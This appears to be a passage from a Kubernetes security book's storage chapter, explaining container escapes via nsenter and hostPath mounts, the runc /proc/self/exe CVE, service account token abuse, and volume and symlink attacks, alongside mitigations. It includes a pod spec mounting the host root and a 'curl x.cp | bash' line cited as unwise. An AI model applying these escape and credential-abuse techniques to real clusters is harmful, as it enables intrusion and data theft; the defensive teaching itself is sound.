</code><code>root</code><code>      </code><code class="m">10</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>S</code><code>    </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>ksoftirqd/0</code><code class="o">]</code><code>
</code><code>root</code><code>      </code><code class="m">11</code><code>  </code><code>0.2</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>I</code><code>    </code><code>03:50</code><code>  </code><code>1:11</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>rcu_sched</code><code class="o">]</code><code>
</code><code>root</code><code>      </code><code class="m">12</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>S</code><code>    </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>migration/0</code><code class="o">]</code></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_storage_CO1-1" href="#co_storage_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Run the <code>nsenter</code> one-liner.</p></dd>
<dt><a class="co" id="callout_storage_CO1-2" href="#co_storage_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Check for root in the process namespace.</p></dd>
<dt><a class="co" id="callout_storage_CO1-3" href="#co_storage_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>Check for kernel PIDs to verify we’re in the root namespace.</p></dd>
</dl>

<p>The form <code>nsenter --all --target ${TARGET_PID}</code> is used for entering all of a process’s namespaces, <a data-type="indexterm" data-primary="nsenter, security considerations" data-startref="nsent_seccons" id="idm45302812300416"/>similar to <code>docker exec</code>.</p>

<p class="pagebreak-before">This is different from volumes mounted from the host:</p>

<pre data-type="programlisting" data-code-language="bash">apiVersion: v1
kind: Pod
metadata:
  name: redis
spec:
  containers:
  - name: redis
    image: redis
    volumeMounts:
    - name: redis-storage
      mountPath: /data/redis
  volumes:
  - name: redis-storage
    hostPath:
     path: /
  nodeName: master</pre>

<p>This <code>redis</code> volume has the host’s disk mounted in the container, but it is not in the same process namespace and can’t affect running instances of the applications started from that disk (like <em>sshd</em>, <em>systemd</em>, or the <code>kubelet</code>). It can change config (including <em>crontab</em>, <em>/etc/shadow</em>, <em>ssh</em>, and <em>systemd</em> unit files), but cannot signal the processes to restart. That means waiting for an event (like a reboot, or daemon reload) to trigger the malicious code, reverse shell, or implant.</p>

<p>Let’s move on to a special case of a filesystem <a data-type="indexterm" data-primary="volumes" data-secondary="mounting" data-tertiary="attacks" data-startref="vol_mount_atak" id="idm45302812328832"/><a data-type="indexterm" data-primary="attacks" data-secondary="volumes" data-tertiary="mounting" data-startref="atak_vol_mount" id="idm45302812356848"/><a data-type="indexterm" data-primary="containers" data-secondary="volumes, attacks" data-startref="cont_vols_atak" id="idm45302812355360"/>vulnerability.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="The /proc/self/exe CVE"><div class="sect2" id="storage-proc-self-exe-cve">
<h2>The /proc/self/exe CVE</h2>

<p>The filesystem <a data-type="indexterm" data-primary="/proc/self/exe CVE" data-primary-sortas="proc/self/exe CVE" id="procselfexe"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="/proc/self/exe" data-secondary-sortas="proc/self/exe CVE" id="CVE_procselfexe"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="/proc/self/exe" data-tertiary-sortas="proc/self/exe CVE" id="sec_CVE_procselfexe"/><a data-type="indexterm" data-primary="attacks" data-secondary="/proc/self/exe CVE" data-secondary-sortas="proc/self/exe CVE" id="atak_procselfexe"/><a data-type="indexterm" data-primary="filesystems" data-secondary="/proc/self/exe CVE attack" data-secondary-sortas="proc/self/exe CVE" id="fs_procselfexe"/><a data-type="indexterm" data-primary="container runtimes" data-secondary="/proc/self/exe CVE attack" data-secondary-sortas="proc/self/exe CVE" id="contrun_procselfexe"/>inside the container is created on the host’s filesystem, so however small it is, there’s still some possibility to escape.</p>

<p>Some situations where this may be possible are when the container runtime has a bug, or makes an incorrect assumption about how to interact with the kernel. For example, if it doesn’t handle a link or file descriptor properly, there is a chance to send malicious input that can lead to a  container breakout.</p>

<p>One of those incorrect assumptions arose from the use of <em>/proc/self/exe</em>, and CVE-2019-5736 was able to break out and affect the host filesystem. Each process namespace has this pseudofile mounted in the <em>/proc</em> virtual filesystem. It points to the location that the currently running process (<em>self</em>) was started from. In this case, it was reconfigured to point to the host’s filesystem, and subsequently used to root the host.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>CVE-2019-5736 is the <code>runc</code> <em>/proc/self/exe</em> vulnerability, in <code>runc</code> through 1.0-rc6 (used by Docker, Podman, Kubernetes, CRI-O, and <code>containerd</code>). Allows attackers to overwrite the <a data-type="indexterm" data-primary="runc" data-secondary="/proc/self/exe CVE attack" data-secondary-sortas="proc/self/exe" id="idm45302812228592"/>host <code>runc</code> binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with <code>docker exec</code>. This occurs because of file-descriptor mishandling, related to <em>/proc/self/exe</em>.</p>

<p>A symlink to <code>self</code> points to the parent process of the <code>clone</code> system call. So first <code>runc</code> ran <code>clone</code>, then inside
the container the child process did an <code>execve</code> system call. That symlink was mistakenly created to point to <code>self</code>
of the parent and not the child. There’s more background on <a href="https://oreil.ly/8tbdA">LWN.net</a>.</p>
</div>

<p>During the startup of a container—as the container runtime is unpacking the filesystem layers ready to <code>pivot_root</code> into them—this pseudofile points to the container runtime, for example <code>runc</code>.</p>

<p>If a malicious container image is able to use this link, it may be able to break<a data-type="indexterm" data-primary="container breakouts" data-secondary="/proc/self/exe CVE" data-secondary-sortas="proc/self/exe CVE" id="idm45302812125696"/> out to the host. One way of doing this is to set the container entrypoint as a symlink to <em>/proc/self/exe</em>, which means the container’s local <em>/proc/self/exe</em> actually points to the container runtime on the host’s filesystem. The detail is shown in <a data-type="xref" href="#storage-proc-self-exe-diagram">Figure 6-5</a>.</p>

<p>Further to this, an attack on a shared library is required to complete the host escalation, but it’s not complex, and once complete, leaves the attacker inside the container with write access to the <code>runc</code> binary outside it.</p>

<p>An interesting feature of this attack is that it can be executed entirely from a malicious image, does not require external input, and is able to execute any payload as root on the host. This is a classic supply chain attack with a cloud native slant. It could be concealed within a legitimate container, and highlights the importance of scanning for known vulnerabilities, but also that this won’t catch everything and intrusion detection is required for a complete defensive<a data-type="indexterm" data-primary="/proc/self/exe CVE" data-primary-sortas="proc/self/exe CVE" data-startref="procselfexe" id="idm45302811925744"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="/proc/self/exe" data-secondary-sortas="proc/self/exe CVE" data-startref="CVE_procselfexe" id="idm45302811924496"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="/proc/self/exe" data-tertiary-sortas="proc/self/exe CVE" data-startref="sec_CVE_procselfexe" id="idm45302811923040"/><a data-type="indexterm" data-primary="attacks" data-secondary="/proc/self/exe CVE" data-secondary-sortas="proc/self/exe CVE" data-startref="atak_procselfexe" id="idm45302811921280"/><a data-type="indexterm" data-primary="filesystems" data-secondary="/proc/self/exe CVE attack" data-secondary-sortas="proc/self/exe CVE" data-startref="fs_procselfexe" id="idm45302811919792"/><a data-type="indexterm" data-primary="container runtimes" data-secondary="/proc/self/exe CVE attack" data-secondary-sortas="proc/self/exe CVE" data-startref="contrun_procselfexe" id="idm45302812103872"/> posture.</p>

<figure><div id="storage-proc-self-exe-diagram" class="figure">
<img src="Images/haku_0605.png" alt="Diagram of the /proc/self/exe breakout" width="1075" height="682"/>
<h6><span class="label">Figure 6-5. </span>Diagram of the <em>/proc/self/exe</em> breakout (source: <a href="https://oreil.ly/JBzVW">“A Compendium of Container Escapes”</a>)</h6>
</div></figure>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Clearly the effects of CVE-2019-5736 were not the intended use of the link, and the assumption that the container runtime could allow a container image access to it was simply unvalidated. In many ways this highlights the difficulty of security and testing in general, which must consider malicious inputs, edge cases, and unexpected code paths. The vulnerability was discovered by the core <code>runc</code> developer concerned about security, Aleksa Sarai, and there was no prior evidence of it being exploited in the wild.</p>
</div>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Sensitive Information at Rest"><div class="sect1" id="idm45302812658496">
<h1>Sensitive Information at Rest</h1>

<p>In the following sections <a data-type="indexterm" data-primary="Secrets management, overview" id="secman_oview"/>we discuss sensitive information at rest, specifically
Secrets management. In Kubernetes,
<a href="https://oreil.ly/m8B8Y">Secrets</a> are
by default stored unencrypted in <code>etcd</code> and can be consumed in the context
of a pod via volumes or via environment variables.</p>








<section data-type="sect2" data-pdf-bookmark="Mounted Secrets"><div class="sect2" id="idm45302812093264">
<h2>Mounted Secrets</h2>

<p>The <code>kubelet</code> running <a data-type="indexterm" data-primary="kubelet" data-secondary="mounted Secrets" id="idm45302812091248"/>on worker<a data-type="indexterm" data-primary="volumes" data-secondary="Secrets" id="vol_sec_oview"/> nodes is responsible for mounting volumes into a pod.
The volumes hold plaintext Secrets, which are mounted into pods for use at runtime.
Secrets are used to interact with other system components, including Kubernetes API
authorization for service account Secrets, or credentials for external services.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Kubernetes v1.21 introduces immutable ConfigMaps and Secrets that can’t be changed after creation:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Secret</code>
<code class="c1"># ...</code>
<code class="nt">data</code><code class="p">:</code>
  <code class="nt">ca.crt</code><code class="p">:</code> <code class="l-Scalar-Plain">LS0tLS1CRUdAcCE55B1e55ed...</code>
  <code class="nt">namespace</code><code class="p">:</code> <code class="l-Scalar-Plain">ZGVmYXVsdA==</code>
  <code class="nt">token</code><code class="p">:</code> <code class="l-Scalar-Plain">ZXlKaGJHY2lPC0DeB1e3d...</code>
<code class="nt">immutable</code><code class="p">:</code> <code class="l-Scalar-Plain">true</code></pre>

<p>Updates to the config or Secret must be done by creating a new Secret, and then creating new pods that reference it.</p>
</div>

<p>If a pirate can <a data-type="indexterm" data-primary="Secrets" data-secondary="compromising" id="idm45302812073136"/>compromise a worker node and gain root privileges, they can read these Secrets and every Secret of each pod on the host. This means root on the node is as powerful as all the workloads it’s running as it can access all their identities.</p>

<p>These standard <a data-type="indexterm" data-primary="service accounts" data-secondary="tokens" id="idm45302812071424"/><a data-type="indexterm" data-primary="tokens, service accounts" id="idm45302812070416"/>service account tokens are limited JSON Web Tokens (JWTs) and never expire, and so have no automated rotation mechanism.</p>

<p>Attackers want to steal your service account tokens to gain deeper access to workloads and data. Service account tokens should be rotated regularly (by deleting them from the Kubernetes Secrets API, where a controller notices and regenerates them).</p>

<p>A more effective process is bound service account tokens, which extend the standard service account token with a full JWT implementation for expiry and audience. Bound service account tokens are requested for a pod by the <code>kubelet</code>, and issued by the API server.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p><a href="https://oreil.ly/o0zkY">Bound service account tokens</a> can <a data-type="indexterm" data-primary="service accounts" data-secondary="bound tokens" id="idm45302812066160"/><a data-type="indexterm" data-primary="bound service account tokens" id="idm45302812065184"/>be used by applications in the same way as standard service account tokens, to verify the identity of a workload.</p>
</div>

<p>The NodeAuthorizer<a data-type="indexterm" data-primary="nodes" data-secondary="NodeAuthorizer, token requests" id="idm45302812063680"/> ensures the <code>kubelet</code> only requests tokens for pods it is supposed to be running, to mitigate against stolen <code>kubelet</code> credentials. The attenuated permissions of bound tokens decrease the blast radius of compromise and the time window for<a data-type="indexterm" data-primary="volumes" data-secondary="secrets" data-startref="vol_sec_oview" id="idm45302812061440"/> exploitation.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Attacking Mounted Secrets"><div class="sect2" id="idm45302812059936">
<h2>Attacking Mounted Secrets</h2>

<p>A<a data-type="indexterm" data-primary="Secrets" data-secondary="mounted, attacks" id="sec_mount_atak"/><a data-type="indexterm" data-primary="mounted secrets, attacks" id="mountsec_atak"/><a data-type="indexterm" data-primary="attacks" data-secondary="mounted secrets" id="atak_mountsec"/> popular mechanism of Kubernetes privilege escalation is service account abuse. When Captain Hashjack gets remote access to a pod, they’ll check for a service account token first. The
<code>selfsubjectaccessreviews.authorization.k8s.io</code> and <code>selfsubjectrulesreviews</code> APIs can be used to enumerate available permissions (<code>kubectl auth can-i --list</code> will show what permissions are available) if there is a service account token mounted.</p>

<p>Or if we can pull binaries, <a href="https://oreil.ly/n5UVm">rakkess</a> shows a much nicer view. Here’s an overprivileged service account:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code><code>rakkess</code><code> </code><a class="co" id="co_storage_CO2-1" href="#callout_storage_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>
</code><code>NAME</code><code>                                             </code><code>LIST</code><code>  </code><code>CREATE</code><code>  </code><code>UPDATE</code><code> </code><code>DELETE</code><code>
</code><code>apiservices.apiregistration.k8s.io</code><code>                </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code><code>
</code><code>...</code><code>
</code><code>secrets</code><code>                                           </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code><code>
</code><code>selfsubjectaccessreviews.authorization.k8s.io</code><code>                           </code><code>✔</code><code>
</code><code>selfsubjectrulesreviews.authorization.k8s.io</code><code>                            </code><code>✔</code><code>
</code><code>serviceaccounts</code><code>                                   </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code><code>
</code><code>services</code><code>                                          </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code><code>
</code><code>...</code><code>
</code><code>volumesnapshotcontents.snapshot.storage.k8s.io</code><code>    </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code><code>
</code><code>volumesnapshots.snapshot.storage.k8s.io</code><code>           </code><code>✔</code><code>      </code><code>✔</code><code>      </code><code>✔</code><code>     </code><code>✔</code></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_storage_CO2-1" href="#co_storage_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>rakkess has some extended options. To retrieve all actions use <code>rakkess --verbs create,get,list,watch,update,patch,delete,deletecollection</code>.</p></dd>
</dl>

<p>This is not a vulnerability, it’s just the way a Kubernetes identity works. But the lack of expiry on unbound service
account tokens is a serious risk. The Kubernetes API server shouldn’t be accessible to any client that doesn’t directly
require it. And that includes pods, which should be firewalled with network policy if they don’t talk to the API.</p>

<p>Operators that talk to the API server must always have a network route and an identity (that is, their service account
can be used to identify them with Kubernetes, and perhaps other systems). This means they need special attention to
ensure that their permissions are not too great, and they consider the system’s resistance to <a data-type="indexterm" data-primary="Secrets management, overview" data-startref="secman_oview" id="idm45302812204816"/><a data-type="indexterm" data-primary="Secrets" data-secondary="mounted, attacks" data-startref="sec_mount_atak" id="idm45302812203872"/><a data-type="indexterm" data-primary="mounted secrets, attacks" data-startref="mountsec_atak" id="idm45302812202656"/><a data-type="indexterm" data-primary="attacks" data-secondary="mounted secrets" data-startref="atak_mountsec" id="idm45302812201744"/>
<span class="keep-together">compromise.</span></p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Storage Concepts"><div class="sect1" id="idm45302812199584">
<h1>Storage Concepts</h1>

<p>In this section, we review Kubernetes <a href="https://oreil.ly/0Hneb">storage</a>
concepts, security best practices, and attacks.</p>








<section data-type="sect2" data-pdf-bookmark="Container Storage Interface"><div class="sect2" id="idm45302812197200">
<h2>Container Storage Interface</h2>

<p>The <a href="https://oreil.ly/clGLR">Container Storage Interface</a>
(CSI) uses<a data-type="indexterm" data-primary="CSI (Container Storage Interface)" id="idm45302812195184"/><a data-type="indexterm" data-primary="Container Storage Interface (CSI)" id="idm45302812194416"/> volumes to integrate pods and external or virtual storage systems.</p>

<p>CSI allows many types of storage <a data-type="indexterm" data-primary="storage" data-secondary="integration" id="idm45302812193216"/>to integrate with Kubernetes, and contains
drivers for most popular block and file storage systems to expose the data in a volume.
These include block and elastic storage from managed services, open source distributed

<span class="keep-together">filesystems</span> like <a href="https://ceph.io">Ceph</a>, dedicated hardware and network attached storage, and a range of
other third-party drivers.</p>

<p>Under the hood these plug-ins “propagate” the mounted <a data-type="indexterm" data-primary="volumes" data-secondary="propagating" id="idm45302812189968"/>volumes, which means sharing them between containers in a pod, or even propagating changes from inside the container back to the host. When the host’s filesystem reflects volumes mounted by the container, this is known as “bi-directional mount propagation.”</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Projected Volumes"><div class="sect2" id="idm45302812188336">
<h2>Projected Volumes</h2>

<p>Kubernetes <a data-type="indexterm" data-primary="projected volumes" id="projvol"/><a data-type="indexterm" data-primary="volumes" data-secondary="projected" id="vol_projt"/>provides special volume types in addition to the standard Linux offerings.
These are used to mount data from the API server or <code>kubelet</code>s into the pod. For example,
to <a href="https://oreil.ly/flMYI">project container or pod metadata into a volume</a>.</p>

<p>Here is a simple example that projects Secret objects into a projected volume
for easy consumption by the <code>test-projected-volume</code> container, setting permissions
on the files it creates on the volume:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code>
<code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">test-projected-volume</code>
<code class="nt">spec</code><code class="p">:</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">test-projected-volume</code>
    <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">busybox</code>
    <code class="nt">args</code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="l-Scalar-Plain">sleep</code>
    <code class="p-Indicator">-</code> <code class="s">"86400"</code>
    <code class="nt">volumeMounts</code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">all-in-one</code>
      <code class="nt">mountPath</code><code class="p">:</code> <code class="s">"/projected-volume"</code>
      <code class="nt">readOnly</code><code class="p">:</code> <code class="l-Scalar-Plain">true</code>
  <code class="nt">volumes</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">all-in-one</code>
    <code class="nt">projected</code><code class="p">:</code>
      <code class="nt">sources</code><code class="p">:</code>
      <code class="p-Indicator">-</code> <code class="nt">secret</code><code class="p">:</code>
          <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">user</code>
          <code class="nt">items</code><code class="p">:</code>
            <code class="p-Indicator">-</code> <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">user</code>
              <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">my-group/my-username</code>
              <code class="nt">mode</code><code class="p">:</code> <code class="l-Scalar-Plain">511</code>
      <code class="p-Indicator">-</code> <code class="nt">secret</code><code class="p">:</code>
          <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">pass</code>
          <code class="nt">items</code><code class="p">:</code>
            <code class="p-Indicator">-</code> <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">pass</code>
              <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">my-group/my-username</code>
              <code class="nt">mode</code><code class="p">:</code> <code class="l-Scalar-Plain">511</code></pre>

<p>Projected volumes take existing data from the same namespace as the pod, and
make it more easily accessible inside the container. The volume types are
listed in <a data-type="xref" href="#table-volume-types">Table 6-1</a>.</p>
<table id="table-volume-types" class="less_space pagebreak-before">
<caption><span class="label">Table 6-1. </span>Kubernetes volume types</caption>
<thead>
<tr>
<th>Volume type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Secret</p></td>
<td><p>Kubernetes API server Secret objects</p></td>
</tr>
<tr>
<td><p>downwardAPI</p></td>
<td><p>Configuration elements from a pod or its node’s configuration (e.g., metadata including labels and annotations, limits and requests, pod and host IPs, and service account and node names)</p></td>
</tr>
<tr>
<td><p>ConfigMap</p></td>
<td><p>Kubernetes API server ConfigMap objects</p></td>
</tr>
<tr>
<td><p>serviceAccountToken</p></td>
<td><p>Kubernetes API server serviceAccountToken</p></td>
</tr>
</tbody>
</table>

<p>This can also <a data-type="indexterm" data-primary="volumes" data-secondary="types" id="idm45302811748592"/>be used to change the location of a service account Secret,
using the <code>TokenRequestProjection</code> feature, which prevents kubectl and its
clients from auto-discovering the service account token. This obscurity—for example,
hiding files in different locations—should not be considered a security boundary,
but rather a simple way to make an attacker’s life more difficult:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code>
<code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">sa-token-test</code>
<code class="nt">spec</code><code class="p">:</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">container-test</code>
    <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">busybox</code>
    <code class="nt">volumeMounts</code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">token-vol</code>
      <code class="nt">mountPath</code><code class="p">:</code> <code class="s">"/service-account"</code>
      <code class="nt">readOnly</code><code class="p">:</code> <code class="l-Scalar-Plain">true</code>
  <code class="nt">volumes</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">token-vol</code>
    <code class="nt">projected</code><code class="p">:</code>
      <code class="nt">sources</code><code class="p">:</code>
      <code class="p-Indicator">-</code> <code class="nt">serviceAccountToken</code><code class="p">:</code>
          <code class="nt">audience</code><code class="p">:</code> <code class="l-Scalar-Plain">api</code>
          <code class="nt">expirationSeconds</code><code class="p">:</code> <code class="l-Scalar-Plain">3600</code>
          <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">token</code></pre>

<p>Every volume mounted into a pod is of interest to an attacker.
It could contain data that they want to steal or exfiltrate, including:</p>

<ul>
<li>
<p>User data and passwords</p>
</li>
<li>
<p>Personally identifiable information</p>
</li>
<li>
<p>An application’s secret sauce</p>
</li>
<li>
<p>Anything that has financial value to its owner</p>
</li>
</ul>

<p>Let’s now see how volumes can<a data-type="indexterm" data-primary="projected volumes" data-startref="projvol" id="idm45302811647808"/><a data-type="indexterm" data-primary="volumes" data-secondary="projected" data-startref="vol_projt" id="idm45302811646832"/> be attacked.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Attacking Volumes"><div class="sect2" id="idm45302812187744">
<h2>Attacking Volumes</h2>

<p>Stateless <a data-type="indexterm" data-primary="volumes" data-secondary="attacks" id="vols_ataks"/><a data-type="indexterm" data-primary="attacks" data-secondary="volumes" id="ataks_vols"/>applications in containers do not persist data inside the container: they receive or request information from other services (applications, databases, or mounted filesystems). An attacker that controls a pod or container is effectively impersonating it, and can steal data from other services using the credentials mounted as Kubernetes Secrets.</p>

<p>The service account token mounted at <em>/var/run/secrets/kubernetes.io/serviceaccount</em> is the <a data-type="indexterm" data-primary="containers" data-secondary="identifying" data-tertiary="account tokens" id="idm45302811639680"/><a data-type="indexterm" data-primary="account tokens, attacks on containers" id="idm45302811638432"/>container’s identity:</p>

<pre data-type="programlisting" data-code-language="bash">bash-4.3# mount <code class="p">|</code> grep secrets
tmpfs on /var/run/secrets/kubernetes.io/serviceaccount <code class="nb">type </code>tmpfs <code class="o">(</code>ro,relatime<code class="o">)</code></pre>

<p>By default a service account token is mounted into every pod instance of a deployment, which makes it a rather general form of identity. It may also be mounted into other  pods and their replicas. GCP’s Workload Identity refers to this as a “workload identity pool,” which can be thought of as a role.</p>

<p>Because the attacker is in the pod, they can maliciously make mundane network requests, using the service account credentials to authorize with cloud IAM services. This can give access to SQL, hot and cold storage, machine images, backups, and other cloud storage systems.</p>

<p>The user running a container’s network-facing process should have least privilege permissions. A vulnerability in a container’s attack surface, which is usually its network-facing socket, gives an attacker initial control of only that process.</p>

<p>Escalating privilege inside a container may involve difficult exploits and hijinks for an adversary, setting yet another security botheration for attackers like Dread Pirate Hashjack, who may be more inclined to pivot to an easier target. Should they persist, they will be unable to penetrate further and must reside in the network for longer, perhaps increasing likelihood of detection.</p>

<p>In this example the pod has a mounted volume at <em>/cache</em>, which it is protected by discretionary access control (DAC) like all other Linux files.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Out-of-context symlink resolution<a data-type="indexterm" data-primary="symlinks" data-secondary="resolution, data exfiltration" id="idm45302811630048"/> in mounted filesystems is a common route for data exfiltration, as demonstrated
in the <code>kubelet</code> following symlinks as root in <em>/var/log</em> from the <em>/logs</em> server endpoint in this <a href="https://oreil.ly/USepT">Hackerone bug bounty</a>.</p>
</div>

<p class="pagebreak-before">The <code>hostMount</code> in action:</p>

<pre data-type="programlisting"># df
Filesystem           1K-blocks      Used Available Use% Mounted on
overlay               98868448   5276296  93575768   5% /
tmpfs                    65536         0     65536   0% /dev
tmpfs                  7373144         0   7373144   0% /sys/fs/cgroup
/dev/sda1             98868448   5276296  93575768   5% /cache</pre>

<p>The filesystem mounted on the volume:</p>

<pre data-type="programlisting"># ls -lap /cache/
total 16
drwxrwxrwx    4 root     root          4096 Feb 25 21:48 ./
drwxr-xr-x    1 root     root          4096 Feb 25 21:46 ../
drwxrwxrwx    2 app-user app-user      4096 Feb 25 21:48 .tmp/
drwxr-xr-x    2 root     root          4096 Feb 25 21:47 hft/</pre>

<p>Here the app user that owns the container’s main process can write temporary files (like processing artifacts) to the
mount, but only read the data in the <em>hft/</em> directory. If the compromised user could write to the <em>hft/</em> directory they
could poison the cache for other users of the volume. If the containers were executing files from the partition, a
backdoor dropped on a shared volume allows an attacker to move between all users of the volume that execute it.</p>

<p>In this case root owns <em>hft/</em> so this attack is not possible without further work by the attacker to become root inside the container.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Containers generally execute only the applications bundled inside their image, to support the principles of determinism and container image scanning. Executing untrusted or unknown code, such as <code>curl x.cp | bash</code> is unwise. Similarly, a binary from a mounted volume or remote location should have its checksum validated before execution.</p>
</div>

<p>The security of the data relies on <a data-type="indexterm" data-primary="filesystem permissions" data-secondary="security considerations" id="idm45302811596192"/>filesystem permissions. If the container maintainer hasn’t set up the filesystem or users correctly, there may be a way for an attacker to get to it. <code>setuid</code> binaries are a traditional route to escalate privilege, and shouldn’t be needed inside a container: privileged operations should be handled by init containers.</p>

<p>But what if the attacker can’t get into the target pod with the volume mounted? They may be able to mount a volume to a rogue pod with stolen service account credentials instead. In this scenario the attacker has permission to deploy to a namespace, and so admission controllers are the last line of defense against stolen credentials. Preventing rootful pods can help to maintain the security of shared volumes, as well as process and devices in the pod or mounted from the host or network.</p>

<p>Root access in a pod is the gateway to trouble. Many attacks can be prevented by dropping to an unprivileged user in a Dockerfile.</p>

<p>Root is omniscient, the rogue’s <a data-type="indexterm" data-primary="volumes" data-secondary="attacks" data-startref="vols_ataks" id="idm45302811592432"/><a data-type="indexterm" data-primary="attacks" data-secondary="volumes" data-startref="ataks_vols" id="idm45302811591184"/>raison d' être.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="The Dangers of Host Mounts"><div class="sect2" id="idm45302811644576">
<h2>The Dangers of Host Mounts</h2>

<p>As pointed<a data-type="indexterm" data-primary="host mounts, security considerations" id="idm45302811588704"/> out in an <a href="https://oreil.ly/sGJgo">Aqua blog post</a> from 2019:</p>
<blockquote>
<p>Kubernetes has many moving parts, and sometimes combining them in certain ways can create unexpected security flaws. In this post you’ll see how a pod running as root and with a mount point to the node’s /var/log directory can expose the entire contents of its host filesystem to any user who has access to its logs.</p></blockquote>

<p>A pod may mount a directory of a host’s filesystem into a container, for example <em>/var/log</em>. The use of a subdirectory does not prevent the container from moving outside of that directory. A <a data-type="indexterm" data-primary="symlinks" data-secondary="security considerations" id="idm45302811585072"/>symlink can reference anywhere on the same filesystem, so an attacker can explore any filesystem they have write access to using symlinks.</p>

<p>Container security systems will prevent this attack, but vanilla Kubernetes is still 
<span class="keep-together">vulnerable.</span></p>

<p>The exploit in <a href="https://oreil.ly/dwQo4">kube-pod-escape</a> demonstrates <a data-type="indexterm" data-primary="kube-pod-escape exploit" id="idm45302811581504"/><a data-type="indexterm" data-primary="exploits" data-secondary="kube-pod-escape" id="idm45302811580768"/>how to escape to the host via writable <code>hostPath</code> mount at <em>/var/log</em>. With write access to the host an attacker can start a new pod by writing a malicious manifest to <em>/etc/kubernetes/manifests/</em> to have the <code>kubelet</code> create it.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Other Secrets and Exfiltraing from Datastores"><div class="sect2" id="idm45302811577920">
<h2>Other Secrets and Exfiltraing from Datastores</h2>

